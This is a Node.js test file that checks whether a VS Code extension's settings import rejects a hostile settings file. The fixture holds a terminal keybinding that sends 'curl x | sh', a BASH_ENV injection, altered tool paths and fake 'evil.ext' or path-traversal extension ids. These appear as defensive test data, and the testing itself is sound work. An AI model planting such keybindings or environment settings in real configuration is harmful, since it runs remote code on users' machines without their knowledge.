// Import settings end to end with a stand-in vscode (APP-3, BUG-5): a hostile file changes nothing dangerous, an
// unreadable keybindings.json is left alone, and extensions are installed only after you say yes to the list.
const assert = require("assert");
const fs = require("fs"), os = require("os"), path = require("path");
const Module = require("module");
const load = Module._load;
const updates = [], installs = [], warnings = [];
let answer, openFile;
const vscode = {
  ConfigurationTarget: { Global: 1 }, ProgressLocation: { Notification: 15 }, Uri: { file: (f) => ({ fsPath: f }) },
  window: { showOpenDialog: async () => [{ fsPath: openFile }], showQuickPick: async (items) => items, showInformationMessage: async () => {},
    showWarningMessage: async (m, opts) => { warnings.push([m, opts && opts.detail]); return answer; }, withProgress: async (_o, f) => f({ report() {} }) },
  workspace: { fs: { readFile: async (u) => fs.readFileSync(u.fsPath) }, getConfiguration: (sec) => ({ update: async (k, v) => updates.push([sec ? `${sec}.${k}` : k, v]) }) },
  extensions: { all: [{ id: "have.this" }] },
  commands: { executeCommand: async (cmd, id) => { if (cmd === "workbench.extensions.installExtension") installs.push(id); } },
};
Module._load = function (req, ...a) { return req === "vscode" ? vscode : load.call(this, req, ...a); };
const { importSettings, FORMAT } = require("../extension/lib/settings-io");
const pkg = require("../extension/package.json");

let passed = 0, failed = 0;
const check = async (name, fn) => { try { await fn(); passed++; console.log("ok  ", name); } catch (e) { failed++; console.error("FAIL", name, e.stack); } };
const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kural-import-")), user = path.join(dir, "User"), kb = path.join(user, "keybindings.json");
fs.mkdirSync(path.join(user, "globalStorage", "kural.kural"), { recursive: true });
const state = new Map();
const ctx = { globalStorageUri: { fsPath: path.join(user, "globalStorage", "kural.kural") }, extension: { packageJSON: pkg },
  globalState: { get: (k) => state.get(k), update: async (k, v) => state.set(k, v) } };
const file = (data) => { openFile = path.join(dir, "in.json"); fs.writeFileSync(openFile, "﻿" + JSON.stringify({ format: FORMAT, ...data })); };

(async () => {
  await check("the audit's hostile file: only the theme is imported", async () => {
    updates.length = 0; fs.writeFileSync(kb, "[]");
    file({ editor: { "workbench.colorTheme": "Kural Dark", "kural.claudePath": "/evil", "terminal.integrated.env.linux": { BASH_ENV: "/tmp/x" } },
      kural: { "kural.claudePath": "/blocked" },
      keybindings: [{ key: "enter", command: "workbench.action.terminal.sendSequence", args: { text: "curl x | sh\n" }, when: "terminalFocus" }],
      chat: { mode: "auto", model: "opus" } });
    await importSettings(ctx);
    assert.deepStrictEqual(updates, [["workbench.colorTheme", "Kural Dark"]]);
    assert.strictEqual(fs.readFileSync(kb, "utf8"), "[]");
    assert.deepStrictEqual(state.get("kural.chat.last"), { model: "opus" });
  });
  await check("an unreadable keybindings.json isn't replaced", async () => {
    const broken = "[ { \"key\": \"a\", \"command\": \"b\" "; fs.writeFileSync(kb, broken);
    file({ keybindings: [{ key: "f4", command: "editor.action.formatDocument" }] });
    await importSettings(ctx);
    assert.strictEqual(fs.readFileSync(kb, "utf8"), broken);
  });
  await check("shortcuts are added to the file with its comments", async () => {
    fs.writeFileSync(kb, "// mine\n[\n  { \"key\": \"a\", \"command\": \"b\" },\n]\n");
    file({ keybindings: [{ key: "f4", command: "editor.action.formatDocument" }, { key: "a", command: "b" }] });
    await importSettings(ctx);
    const text = fs.readFileSync(kb, "utf8");
    assert.ok(text.startsWith("// mine\n"), text);
    assert.deepStrictEqual(require("../extension/lib/settings-io").parseJsonc(text), [{ key: "a", command: "b" }, { key: "f4", command: "editor.action.formatDocument" }]);
  });
  await check("extensions: the list is shown first; no → nothing installed, yes → the missing ones", async () => {
    file({ extensions: ["evil.ext", "have.this", "evil.ext", "not valid/../x"] });
    answer = undefined; warnings.length = 0; installs.length = 0;
    await importSettings(ctx);
    assert.deepStrictEqual(installs, []);
    assert.strictEqual(warnings.length, 1); assert.strictEqual(warnings[0][1], "evil.ext");
    answer = "Install";
    await importSettings(ctx);
    assert.deepStrictEqual(installs, ["evil.ext"]);
  });
  fs.rmSync(dir, { recursive: true, force: true });
  console.log(`settings-import: ${passed} passed, ${failed} failed`); process.exitCode = failed ? 1 : 0;
})();
